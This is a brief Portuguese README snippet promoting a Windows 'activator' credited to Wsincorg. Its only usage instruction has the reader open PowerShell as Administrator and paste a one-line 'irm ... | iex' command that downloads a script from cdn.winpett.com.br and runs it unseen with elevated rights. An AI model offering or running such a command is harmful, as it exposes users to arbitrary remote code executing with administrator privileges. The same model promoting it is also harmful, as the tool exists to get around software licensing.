...
### Ativador verificado e modelado por Wsincorg com base no código MAS e do autor do projeto, dadorner-msft.
<br>
...
<b><ins>Uso</ins>:</b> <i>Abra o Powershell (Executar como Administrador) e cole o comando abaixo:</i><br>
 ...
 ```powershell
irm cdn.winpett.com.br/scripts/archive_name_contributor | iex
```
<br>
